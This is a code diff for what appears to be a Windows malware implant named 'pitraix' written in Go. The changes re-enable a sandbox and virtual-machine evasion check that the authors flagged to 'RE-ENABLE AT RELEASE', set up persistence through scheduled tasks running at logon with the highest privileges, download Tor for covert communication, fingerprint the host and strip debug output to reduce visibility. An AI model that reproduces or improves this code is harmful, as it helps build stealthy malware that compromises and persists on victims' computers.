@@ -77,7 +77,7 @@ var (
 	tmpFold 	 = os.Getenv("tmp")
 
 	username 	 = os.Getenv("username") // strings.TrimSpace(doInstru("shell", "echo %username%"))
-	osArch 		 = strings.Split(strings.TrimSpace(doInstru("shell", "wmic os get osarchitecture")), "\n")[1]
+	osArch 		 = os.Getenv("PROCESSOR_ARCHITECTURE") // strings.Split(strings.TrimSpace(doInstru("shell", "wmic os get osarchitecture")), "\n")[1]
 	userHomeDIR  = os.Getenv("USERPROFILE")
 	mainDrive    = os.Getenv("HOMEDRIVE")
 	shell		 = mainDrive + "\\Windows\\System32\\cmd.exe"
@@ -492,22 +492,19 @@ func setupTor(path, port, name string, ipinfo_struct *ipInfo, forceSetup bool) s
 				ed := strings.Index(z, "<")
 				fnl := strings.TrimSpace(z[st:ed])
 				
-				tor, err = getRequest(fmt.Sprintf("https://dist.torproject.org/torbrowser/%d.%d.%d/%s", v1m, v2m, v3m, fnl), false, -1)
+				tor, _ = getRequest(fmt.Sprintf("https://dist.torproject.org/torbrowser/%d.%d.%d/%s", v1m, v2m, v3m, fnl), false, -1)
 				// fmt.Println(tor, err)
 
-				fmt.Println(err)
-				f, err := os.Create(filepath.Join(path, name + ".zip")) // path + "\\" + name + ".zip")
+				f, _ := os.Create(filepath.Join(path, name + ".zip")) // path + "\\" + name + ".zip")
 				f.Write(tor)
-				fmt.Println(err, path, name)
 				f.Close()
 				break
 			}
 
 		}
-		// unzip(path + "\\" + name + ".zip", path + "\\" + name)
+
 		unzip(filepath.Join(path, name + ".zip"), filepath.Join(path, name))
 
-		// os.Remove(path + "\\" + name + ".zip")
 		os.Remove(filepath.Join(path, name + ".zip"))
 
 		torrcf, _ := os.Create(filepath.Join(path, name, name + "torrc")) // os.Create(path + "\\" + name + "\\" + name + "torc")
@@ -984,7 +981,6 @@ func getMachineInfo() (string, int, string, string, int, string, string, string)
 
 
 func vmCheck(userHostname, cpuVendor, machineVendor, machineModel string) {
-	vm := false
 	var vmCPU = map[string]bool{
 		"bhyve bhyve ": true,
 		" KVMKVMKVM  ": true,
@@ -997,15 +993,7 @@ func vmCheck(userHostname, cpuVendor, machineVendor, machineModel string) {
 		" QNXQVMBSQG ": true, // effect embedded systems 
 
 	}
-	if vmCPU[cpuVendor] {
-		vm = true
-	}
-
-	if machineVendor == "innotek GmbH" || machineModel == "VirtualBox" {
-		vm = true
-	}
-
-	if vm == true {
+	if vmCPU[cpuVendor] || machineVendor == "innotek GmbH" || machineModel == "VirtualBox" {
 		fmt.Println("VM!")
 		os.Exit(0)
 	}
@@ -1061,17 +1049,13 @@ func main() {
 	cpuinfo_raw := strings.TrimSpace(doInstru("shell", "wmic CPU get name, manufacturer")[18:]) // "Intel(R) Core(TM) i5-4590 CPU @ 3.30GHz" // cpuInfo_Split[1] // fix
 	cpuinfo_split := strings.Fields(cpuinfo_raw)
 	cpu := strings.TrimSpace(cpuinfo_raw[len(cpuinfo_split[0]):])
-	cpuVendor := cpuinfo_split[0] //cpuInfo_Split[2] // fix
-	fmt.Println("cpuVendor:", cpuVendor)
+	cpuVendor := cpuinfo_split[0]
 
 	userHostname, machineType, osVariant, kernelVersion, arch, machineVendor, machineModel, memory := getMachineInfo()
-	fmt.Println(userHostname, osVariant, kernelVersion, arch, machineVendor, machineModel)
+	// fmt.Println(userHostname, osVariant, kernelVersion, arch, machineVendor, machineModel)
 
-	/*
-		####################################### DEBUGGING RE-ENABLE AT RELEASE!!! ############################################
-
-		vmCheck(userHostname, cpuVendor, machineVendor, machineModel)
-	*/
+	vmCheck(userHostname, cpuVendor, machineVendor, machineModel)
+	
 
 	if tor_running_check() { // exits if already running
 		os.Exit(0)
@@ -1133,9 +1117,9 @@ func main() {
 	
 	firstTime = !file_Exists(pitraix_FilePath)
 
-	fmt.Println("torPort:", torPort)
-	fmt.Println("firstTime:", firstTime)
-	fmt.Println("isadmin_const:", isadmin_const)
+	// fmt.Println("torPort:", torPort)
+	// fmt.Println("firstTime:", firstTime)
+	// fmt.Println("isadmin_const:", isadmin_const)
 
 	if firstTime == true {
 		// srcFile, _ := os.Open(currentPath)
@@ -1148,11 +1132,11 @@ func main() {
 		if isadmin_const {
 			// doInstru("shell", `schtasks.exe /CREATE /SC ONLOGON /TN "` + pitraix_taskName + `" /TR "` + pitraix_FilePath + `" /RL HIGHEST /F`)
 			out := doInstru("shell", fmt.Sprintf("schtasks.exe /CREATE /SC ONLOGON /TN %s /TR %s /RL HIGHEST /F", pitraix_taskName, pitraix_FilePath))
-			fmt.Println("admin!", out)
+			// fmt.Println("admin!", out)
 		} else {
 			fmt.Println(`schtasks.exe /CREATE /SC DAILY /TN "` + pitraix_taskName + `" /TR "` + pitraix_FilePath + `"`)
 			out := doInstru("shell", fmt.Sprintf("schtasks.exe /CREATE /SC DAILY /TN %s /TR %s", pitraix_taskName, pitraix_FilePath))
-			fmt.Println("no :(", out)
+			// fmt.Println("no :(", out)
 		}
 	}
 
